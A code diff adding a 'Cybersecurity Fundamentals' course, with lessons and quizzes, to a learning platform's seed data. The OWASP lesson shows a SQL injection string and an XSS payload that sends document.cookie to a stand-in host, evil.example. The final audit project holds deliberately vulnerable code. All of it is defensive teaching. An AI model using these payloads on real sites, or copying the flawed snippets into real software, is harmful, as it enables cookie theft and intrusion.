@@ -137,6 +137,15 @@ const paths = [
     projectCount: 8,
     description: 'A lightweight, embeddable scripting language used everywhere from game engines to Neovim configs.',
   },
+  {
+    slug: 'cybersecurity',
+    name: 'Cybersecurity',
+    icon: '🔒',
+    difficulty: 3,
+    estimatedHours: 35,
+    projectCount: 10,
+    description: 'Think like an attacker to defend like a pro: the CIA triad, common attack vectors, network and web app security, cryptography, and access control.',
+  },
 ];
 
 type SeedQuestion = {
@@ -5274,6 +5283,213 @@ const luaAdvancedLessons: SeedLesson[] = [
   },
 ];
 
+const cybersecurityLessons: SeedLesson[] = [
+  {
+    title: 'Introduction to Cybersecurity',
+    content: lessonContent(
+      'Introduction to Cybersecurity',
+      `Cybersecurity is the practice of protecting systems, networks, and data from unauthorized access, disruption, or theft. Every decision in security is a tradeoff between usability, cost, and risk, there is no such thing as a perfectly secure system, only one whose risk has been reduced to an acceptable level.\n\n## The CIA triad\n\nAlmost every security control exists to protect one of three properties:\n\n| Property | Meaning | Example attack that breaks it |\n|---|---|---|\n| **Confidentiality** | Only authorized people can read the data | Stealing a database of passwords |\n| **Integrity** | Data cannot be modified without detection | Tampering with a bank transfer amount in transit |\n| **Availability** | Systems stay up and usable | A denial-of-service attack that takes a site offline |\n\n## Key vocabulary\n\n- **Asset**: anything worth protecting (a server, a database, a customer's data).\n- **Threat**: anything that could cause harm to an asset (an attacker, a bug, a flood).\n- **Vulnerability**: a weakness that a threat could exploit (unpatched software, a weak password policy).\n- **Exploit**: the specific technique used to take advantage of a vulnerability.\n- **Risk**: the likelihood of a threat exploiting a vulnerability, multiplied by the impact if it does.\n\n> [!TIP]\n> A useful mental model: **Risk = Threat × Vulnerability × Impact**. Security work usually focuses on reducing vulnerability (patching, configuration) since you can rarely control the threat itself.\n\n## Why this matters even if you're "just" a developer\n\nMost real-world breaches don't start with an exotic zero-day, they start with an unpatched dependency, a misconfigured cloud bucket, or a form field that trusts user input a little too much. Security is not a separate team's job bolted on at the end, it's a property of the code you write every day.`
+    ),
+    quiz: {
+      title: 'Cybersecurity Basics',
+      passingScore: 70,
+      questions: [
+        {
+          type: 'MULTIPLE_CHOICE',
+          prompt: 'Which of the CIA triad properties does a denial-of-service attack primarily target?',
+          options: ['Confidentiality', 'Integrity', 'Availability', 'Accountability'],
+          answer: 'Availability',
+        },
+        {
+          type: 'TRUE_FALSE',
+          prompt: 'A vulnerability and an exploit mean the same thing.',
+          options: ['True', 'False'],
+          answer: 'False',
+        },
+        {
+          type: 'FILL_BLANK',
+          prompt: 'A weakness in a system that a threat could take advantage of is called a ____.',
+          options: [],
+          answer: 'vulnerability',
+        },
+      ],
+    },
+  },
+  {
+    title: 'Common Attack Vectors',
+    content: lessonContent(
+      'Common Attack Vectors',
+      `An **attack vector** is the path or method an attacker uses to gain unauthorized access. Most breaches use one of a small handful of well-known vectors, understanding them is most of what it takes to defend against them.\n\n## Social engineering\n\nThe majority of breaches start by manipulating a person, not a machine:\n\n- **Phishing**: fraudulent emails or messages that impersonate a trusted source to trick someone into clicking a link, entering credentials, or opening an attachment.\n- **Spear phishing**: a targeted phishing attack aimed at a specific person, using details about them (their job title, a real coworker's name) to look convincing.\n- **Pretexting**: inventing a false scenario ("I'm from IT, I need your password to fix an issue") to extract information.\n\n## Malware\n\n| Type | What it does |\n|---|---|\n| Virus | Attaches to a legitimate file, spreads when that file runs |\n| Worm | Spreads on its own across a network, no host file needed |\n| Trojan | Disguised as legitimate software, opens a backdoor once installed |\n| Ransomware | Encrypts a victim's files and demands payment for the key |\n| Spyware | Silently collects information (keystrokes, browsing habits) |\n\n## Brute force and credential attacks\n\n- **Brute force**: trying every possible password combination.\n- **Dictionary attack**: trying common passwords or leaked password lists instead of every combination, far faster in practice.\n- **Credential stuffing**: reusing username/password pairs leaked from one breach to try logging into other, unrelated services, this is why reusing passwords across sites is so dangerous.\n\n> [!WARNING]\n> Credential stuffing works because people reuse passwords. A single breached, low-security forum can lead directly to a compromised email or bank account if the same password was reused.`
+    ),
+    quiz: {
+      title: 'Attack Vectors Quiz',
+      passingScore: 70,
+      questions: [
+        {
+          type: 'MULTIPLE_CHOICE',
+          prompt: 'Which malware type spreads across a network on its own, without needing a host file?',
+          options: ['Virus', 'Worm', 'Trojan', 'Spyware'],
+          answer: 'Worm',
+        },
+        {
+          type: 'TRUE_FALSE',
+          prompt: 'Credential stuffing relies on people reusing the same password across multiple sites.',
+          options: ['True', 'False'],
+          answer: 'True',
+        },
+        {
+          type: 'FILL_BLANK',
+          prompt: 'A phishing attack that is specifically targeted at one individual using personal details is called ____ phishing.',
+          options: [],
+          answer: 'spear',
+        },
+      ],
+    },
+  },
+  {
+    title: 'Network Security Basics',
+    content: lessonContent(
+      'Network Security Basics',
+      `Every device that talks to a network exposes an **attack surface**, the sum of all the points where an attacker could try to get in. Network security is largely about shrinking that surface and controlling what is allowed to cross it.\n\n## Ports and protocols\n\nA port identifies a specific service running on a machine. A handful show up constantly:\n\n| Port | Protocol | Purpose |\n|---|---|---|\n| 22 | SSH | Encrypted remote shell access |\n| 80 | HTTP | Unencrypted web traffic |\n| 443 | HTTPS | Encrypted web traffic (TLS) |\n| 25 | SMTP | Sending email |\n| 3389 | RDP | Remote desktop (Windows) |\n\nTCP is connection-oriented and guarantees delivery order (used for web pages, file transfers), UDP is connectionless and faster but can drop or reorder packets (used for video calls, DNS lookups).\n\n## Firewalls\n\nA firewall inspects traffic and decides what to allow or block, based on rules like source IP, destination port, or protocol.\n\n\`\`\`bash\n# Example: a rule that only allows SSH from a specific trusted IP\nsudo ufw allow from 203.0.113.10 to any port 22\nsudo ufw deny 22\n\`\`\`\n\nThe principle behind good firewall rules is **default deny**: block everything, then explicitly allow only what is needed. This is much safer than trying to enumerate every bad thing to block.\n\n## VPNs\n\nA VPN (Virtual Private Network) creates an encrypted tunnel between a device and a private network over the public internet, so traffic can't be read or tampered with by anyone in between, useful for accessing internal company systems securely from an untrusted network like public Wi-Fi.\n\n> [!TIP]\n> "Attack surface" isn't just about open ports, every dependency, every exposed API endpoint, and every user input field is also part of your attack surface.`
+    ),
+    quiz: {
+      title: 'Network Security Quiz',
+      passingScore: 70,
+      questions: [
+        {
+          type: 'MULTIPLE_CHOICE',
+          prompt: 'Which port is conventionally used for encrypted HTTPS web traffic?',
+          options: ['21', '80', '443', '3389'],
+          answer: '443',
+        },
+        {
+          type: 'TRUE_FALSE',
+          prompt: 'A "default deny" firewall policy blocks everything by default and only explicitly allows what is needed.',
+          options: ['True', 'False'],
+          answer: 'True',
+        },
+        {
+          type: 'FILL_BLANK',
+          prompt: 'A ____ creates an encrypted tunnel between a device and a private network over the public internet.',
+          options: [],
+          answer: 'VPN',
+        },
+      ],
+    },
+  },
+  {
+    title: 'Web Application Security & the OWASP Top 10',
+    content: lessonContent(
+      'Web Application Security & the OWASP Top 10',
+      `The **OWASP Top 10** is the industry-standard list of the most critical web application security risks. Three of the most common show up constantly in real applications:\n\n## SQL injection\n\nWhen user input is concatenated directly into a SQL query, an attacker can change the query's meaning entirely:\n\n\`\`\`js\n// Vulnerable: user input goes straight into the query string\nconst query = \`SELECT * FROM users WHERE username = '\${username}'\`;\n\n// If username is:  ' OR '1'='1\n// The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'\n// ...which matches every row, bypassing the login check entirely\n\`\`\`\n\n**Fix**: always use parameterized queries / prepared statements, which send the input separately from the query structure so it can never be interpreted as SQL:\n\n\`\`\`js\n// Safe: the database driver handles escaping, input is never treated as SQL\nawait db.query('SELECT * FROM users WHERE username = ?', [username]);\n\`\`\`\n\n## Cross-site scripting (XSS)\n\nXSS happens when an attacker gets their own JavaScript to run in another user's browser, usually by injecting a \`<script>\` tag into content that gets rendered without escaping:\n\n\`\`\`html\n<!-- If a comment field is rendered without escaping, and a user submits: -->\n<script>fetch('https://evil.example/steal?cookie=' + document.cookie)</script>\n<!-- ...that script now runs in every other visitor's browser who views the comment -->\n\`\`\`\n\n**Fix**: escape user-generated content before rendering it as HTML (most modern frameworks like React do this by default), and use a Content-Security-Policy header to restrict what scripts are allowed to run at all.\n\n## Cross-site request forgery (CSRF)\n\nCSRF tricks a logged-in user's browser into submitting a request they didn't intend to make, since browsers automatically attach cookies to requests, a malicious site can make your browser send a request to a site you're logged into.\n\n**Fix**: require a unique, unpredictable CSRF token on state-changing requests (form submissions, not just GET requests), and set cookies with \`SameSite=Strict\` or \`SameSite=Lax\` so they aren't sent on cross-site requests.\n\n> [!WARNING]\n> The common thread across all three: **never trust user input**. Validate it, escape it for the context it's used in (SQL, HTML, a shell command), and use APIs (parameterized queries, templating engines) that make the safe way the easy way.`
+    ),
+    quiz: {
+      title: 'OWASP Top 10 Quiz',
+      passingScore: 70,
+      questions: [
+        {
+          type: 'MULTIPLE_CHOICE',
+          prompt: 'What is the recommended fix for SQL injection?',
+          options: [
+            'Blocking the letter O in user input',
+            'Parameterized queries / prepared statements',
+            'Only allowing admins to log in',
+            'Using a longer database password',
+          ],
+          answer: 'Parameterized queries / prepared statements',
+        },
+        {
+          type: 'TRUE_FALSE',
+          prompt: 'Setting cookies with SameSite=Strict or SameSite=Lax helps defend against CSRF.',
+          options: ['True', 'False'],
+          answer: 'True',
+        },
+        {
+          type: 'FILL_BLANK',
+          prompt: 'An attack where malicious JavaScript is injected into a page and runs in other users\' browsers is called cross-site ____.',
+          options: [],
+          answer: 'scripting',
+        },
+      ],
+    },
+  },
+  {
+    title: 'Cryptography Basics',
+    content: lessonContent(
+      'Cryptography Basics',
+      `Cryptography underpins almost every security control: HTTPS, password storage, and secure messaging all depend on it. You don't need to implement algorithms yourself, but you do need to know which tool fits which job.\n\n## Hashing vs. encryption\n\nThese are often confused, but solve different problems:\n\n| | Hashing | Encryption |\n|---|---|---|\n| Direction | One-way, cannot be reversed | Two-way, can be decrypted with the right key |\n| Use case | Verifying passwords, detecting tampering | Protecting data you need to read again later |\n| Example | \`bcrypt\`, \`SHA-256\` | AES, RSA |\n\n**Never store passwords in plain text, and never encrypt them either**, always hash them with a slow, salted algorithm designed for passwords, like bcrypt:\n\n\`\`\`js\nimport bcrypt from 'bcryptjs';\n\nconst passwordHash = await bcrypt.hash(plainTextPassword, 10); // 10 = cost factor\nconst matches = await bcrypt.compare(attemptedPassword, passwordHash);\n\`\`\`\n\nbcrypt is deliberately slow and includes a random **salt** per password, so two identical passwords produce different hashes, and brute-forcing many hashes at once can't be sped up with a precomputed table (a "rainbow table").\n\n## Symmetric vs. asymmetric encryption\n\n- **Symmetric**: the same key encrypts and decrypts (AES). Fast, but both parties need to already share the key securely.\n- **Asymmetric**: a public key encrypts, only the matching private key can decrypt (RSA). Slower, but solves the key-sharing problem, you can publish your public key freely.\n\n## TLS/HTTPS\n\nHTTPS uses both: an asymmetric handshake to securely agree on a shared secret, then fast symmetric encryption for the actual data transfer. This is why the browser padlock icon means the connection is encrypted and the server's identity was verified by a certificate, but it says nothing about whether the site itself is trustworthy.\n\n> [!TIP]\n> "Encrypted" is not the same as "secure": a phishing site can have a valid HTTPS certificate too. TLS protects data in transit, it doesn't vouch for who's on the other end.`
+    ),
+    quiz: {
+      title: 'Cryptography Quiz',
+      passingScore: 70,
+      questions: [
+        {
+          type: 'MULTIPLE_CHOICE',
+          prompt: 'Which is the correct way to store user passwords?',
+          options: [
+            'Encrypt them with AES so they can be decrypted if needed',
+            'Hash them with a slow, salted algorithm like bcrypt',
+            'Store them in plain text for easy lookup',
+            'Encode them with Base64',
+          ],
+          answer: 'Hash them with a slow, salted algorithm like bcrypt',
+        },
+        {
+          type: 'TRUE_FALSE',
+          prompt: 'A valid HTTPS certificate guarantees that a website itself is trustworthy, not just that the connection is encrypted.',
+          options: ['True', 'False'],
+          answer: 'False',
+        },
+        {
+          type: 'FILL_BLANK',
+          prompt: 'In ____ encryption, the same key is used to both encrypt and decrypt the data.',
+          options: [],
+          answer: 'symmetric',
+        },
+      ],
+    },
+  },
+  {
+    title: 'Authentication & Access Control',
+    content: lessonContent(
+      'Authentication & Access Control',
+      `Authentication answers "who are you?", authorization (access control) answers "what are you allowed to do?". Getting both right is one of the highest-leverage things you can do for an application's security.\n\n## Strong password practices\n\n- Enforce a minimum length (length matters far more than forcing arbitrary symbol/number rules).\n- Check new passwords against known breached-password lists, not just complexity rules.\n- Never limit maximum password length aggressively or block pasting into password fields, both push users toward weaker, reused passwords.\n\n## Multi-factor authentication (MFA)\n\nMFA requires two or more of these independent factors:\n\n1. **Something you know** (a password, a PIN)\n2. **Something you have** (a phone, a hardware security key)\n3. **Something you are** (a fingerprint, facial recognition)\n\nEven if a password is stolen through phishing, MFA stops most account takeovers because the attacker also needs the second factor.\n\n## The principle of least privilege\n\nEvery user, process, and service should have the **minimum** access needed to do its job, nothing more. A web server that only needs to read a database table shouldn't have a database account that can also drop tables.\n\n## Role-based access control (RBAC)\n\nRather than granting permissions to individuals one by one, RBAC groups permissions into roles (like \`STUDENT\`, \`INSTRUCTOR\`, \`ADMIN\`), and assigns users to roles. This makes access easy to reason about and audit, when someone changes teams, you change their role, not a long list of individual permissions.\n\n\`\`\`js\n// Checking a role before allowing an action, a simple RBAC check\nfunction requireRole(user, ...allowedRoles) {\n  if (!allowedRoles.includes(user.role)) {\n    throw new Error('Forbidden: insufficient permissions');\n  }\n}\n\`\`\`\n\n> [!WARNING]\n> Access control bugs are rarely about the check being wrong, they're about a check being **missing** entirely on one endpoint. Every action that changes or reveals data needs its own explicit authorization check, don't assume that hiding a button in the UI is enough, the API endpoint itself must enforce it.`
+    ),
+    quiz: {
+      title: 'Auth & Access Control Quiz',
+      passingScore: 70,
+      questions: [
+        {
+          type: 'MULTIPLE_CHOICE',
+          prompt: 'Which of these is an example of the "something you have" MFA factor?',
+          options: ['A password', 'A fingerprint', 'A hardware security key', 'A security question'],
+          answer: 'A hardware security key',
+        },
+        {
+          type: 'TRUE_FALSE',
+          prompt: 'The principle of least privilege means giving every user or service the minimum access needed to do its job.',
+          options: ['True', 'False'],
+          answer: 'True',
+        },
+        {
+          type: 'FILL_BLANK',
+          prompt: 'Grouping permissions into named roles like STUDENT, INSTRUCTOR, and ADMIN, then assigning users to roles, is called ____-based access control.',
+          options: [],
+          answer: 'role',
+        },
+      ],
+    },
+  },
+  {
+    title: 'Final Project: Security Audit Report',
+    content: lessonContent(
+      'Final Project: Security Audit Report',
+      `Time to put everything together. You'll perform a security audit of a small, deliberately flawed web application and write up your findings like a real security assessment.\n\n## Scenario\n\nYou're reviewing a simple app with a login form, a comment section, and a "search users" feature. Here's a sketch of how it currently works:\n\n\`\`\`js\n// Login check\nconst query = \`SELECT * FROM users WHERE email = '\${email}' AND password = '\${password}'\`;\n\n// Rendering a comment\nelement.innerHTML = comment.text;\n\n// Password storage\nawait db.query('INSERT INTO users (email, password) VALUES (?, ?)', [email, password]);\n\n// Any logged-in user can call this to view any other user's private profile:\napp.get('/api/users/:id', (req, res) => res.json(getUser(req.params.id)));\n\`\`\`\n\n## Requirements\n\nWrite up a security audit report (as a markdown file in a repo, or a doc, your choice) that includes:\n\n1. **Identify at least 4 distinct vulnerabilities** in the scenario above, name each one using proper terminology (e.g. "SQL injection", "stored XSS", "broken access control", "insecure password storage").\n2. For each vulnerability, explain **how an attacker could exploit it** in plain language, one or two sentences is enough.\n3. For each vulnerability, propose a **specific fix**, referencing techniques from this course (parameterized queries, output escaping, password hashing, authorization checks, etc.).\n4. Rank the four vulnerabilities by severity (which would you fix first, and why?).\n5. Add a short "general recommendations" section with at least 2 practices a team could adopt going forward (e.g. dependency scanning, code review checklists, MFA for admin accounts).\n\n## Stretch goals\n\n- Propose a rewritten, safe version of one of the vulnerable code snippets above.\n- Research and briefly summarize one real-world breach that resulted from a vulnerability of the same class as one you identified.\n\nSubmit a link to your finished report below (a repo, gist, or shared doc), an instructor will review it before you can mark this lesson complete. Good luck! 🔒`
+    ),
+    requiresSubmission: true,
+  },
+];
+
 const coursesByPath: Record<string, { title: string; description: string; lessons: SeedLesson[] }[]> = {
   nodejs: [
     {
@@ -5431,6 +5647,13 @@ const coursesByPath: Record<string, { title: string; description: string; lesson
       title: 'Lua Advanced: Coroutines, Metamethods & Performance',
       description: 'Cooperative multitasking with coroutines, operator overloading and __call/__newindex, variadic functions, and garbage collection with weak tables.',
       lessons: luaAdvancedLessons,
+    },
+  ],
+  cybersecurity: [
+    {
+      title: 'Cybersecurity Fundamentals',
+      description: 'Think like an attacker to defend like a pro: the CIA triad, common attack vectors, network and web app security, cryptography, and access control.',
+      lessons: cybersecurityLessons,
     },
   ],
 };
